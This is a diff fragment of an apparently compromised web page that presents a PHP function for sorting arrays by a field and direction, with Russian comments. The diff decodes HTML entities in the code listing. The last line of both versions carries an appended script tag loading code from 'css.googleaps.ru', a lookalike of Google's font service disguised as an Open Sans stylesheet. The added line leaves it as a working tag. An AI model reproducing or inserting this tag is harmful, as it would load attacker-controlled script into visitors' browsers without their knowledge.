@@ -43,10 +43,10 @@ comments: []
         unset($v[&#039;__________2&#039;]);<br />
     }<br />
 }</p>
-<p>&#47;&#47;Сортировка<br />
+<p>//Сортировка<br />
 function cmp($a, $b)<br />
 {<br />
-    &#47;&#47; Если поле сортировки не задано сортируем по цене<br />
+    // Если поле сортировки не задано сортируем по цене<br />
     $sortBy = $a[&#039;__________1&#039;];<br />
     if ($sortBy != &#039;&#039;) {<br />
         $at = $a[$sortBy];<br />
@@ -60,7 +60,7 @@ function cmp($a, $b)<br />
 if ($at == $bt) {<br />
     return 0;<br />
 }<br />
-&#47;&#47;По умолчанию сортируем ASC<br />
+//По умолчанию сортируем ASC<br />
 $sortDir = $a[&#039;__________2&#039;];<br />
 if ($sortDir == &#039;ASC&#039;) {<br />
     return ($at < $bt) ? -1 : 1;<br />
@@ -68,7 +68,7 @@ if ($sortDir == &#039;ASC&#039;) {<br />
     return ($at < $bt) ? 1 : -1;<br />
 }<br />
 }</p>
-<p>&#47;&#47;Использование<br />
+<p>//Использование<br />
 $massiv = array();<br />
-&#47;&#47;Сортируем массив по цене в порядке увеличения<br />
-sort_params($massiv, &#039;price&#039;, &#039;ASC&#039;);<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
+//Сортируем массив по цене в порядке увеличения<br />
+sort_params($massiv, &#039;price&#039;, &#039;ASC&#039;);<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre></p>
